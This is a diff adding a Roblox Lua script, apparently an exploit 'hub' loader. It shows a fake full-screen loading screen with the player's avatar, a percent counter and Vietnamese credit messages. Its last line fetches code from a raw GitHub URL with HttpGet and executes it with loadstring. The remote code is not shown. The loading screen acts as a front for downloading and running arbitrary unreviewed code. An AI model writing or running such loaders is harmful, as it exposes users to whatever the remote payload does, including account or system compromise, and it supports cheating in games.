@@ -1,0 +1,70 @@
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local player = Players.LocalPlayer
+
+-- GUI
+local gui = Instance.new("ScreenGui", game.CoreGui)
+gui.Name = "BananaLoading"
+
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(1,0,1,0)
+frame.BackgroundColor3 = Color3.fromRGB(15,15,15)
+
+-- Avatar
+local avatar = Instance.new("ImageLabel", frame)
+avatar.Size = UDim2.new(0,150,0,150)
+avatar.Position = UDim2.new(0.5,-75,0.25,-75)
+avatar.BackgroundTransparency = 1
+
+local userId = player.UserId
+local thumbType = Enum.ThumbnailType.HeadShot
+local thumbSize = Enum.ThumbnailSize.Size420x420
+local content,isReady = Players:GetUserThumbnailAsync(userId,thumbType,thumbSize)
+avatar.Image = content
+
+-- Text
+local textLabel = Instance.new("TextLabel", frame)
+textLabel.Size = UDim2.new(1,0,0,50)
+textLabel.Position = UDim2.new(0,0,0.55,0)
+textLabel.BackgroundTransparency = 1
+textLabel.TextColor3 = Color3.new(1,1,1)
+textLabel.TextScaled = true
+textLabel.Font = Enum.Font.GothamBold
+textLabel.Text = "Loading..."
+
+-- Percent
+local percent = Instance.new("TextLabel", frame)
+percent.Size = UDim2.new(1,0,0,50)
+percent.Position = UDim2.new(0,0,0.7,0)
+percent.BackgroundTransparency = 1
+percent.TextColor3 = Color3.new(0,1,0)
+percent.TextScaled = true
+percent.Font = Enum.Font.GothamBold
+percent.Text = "0%"
+
+local messages = {
+	"bình an dz",
+	"yêu nước",
+	"script made by bình an dz",
+	"banana cat hub free",
+	"bác hồ kính yêu"
+}
+
+-- Loading
+spawn(function()
+	for i = 1,100 do
+		percent.Text = i.."%"
+		
+		if i == 20 then textLabel.Text = messages[1] end
+		if i == 40 then textLabel.Text = messages[2] end
+		if i == 60 then textLabel.Text = messages[3] end
+		if i == 80 then textLabel.Text = messages[4] end
+		if i == 100 then textLabel.Text = messages[5] end
+		
+		wait(0.03)
+	end
+	
+	wait(1)
+	gui:Destroy()
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aloaloalo322/sssdas/refs/heads/main/cc"))()
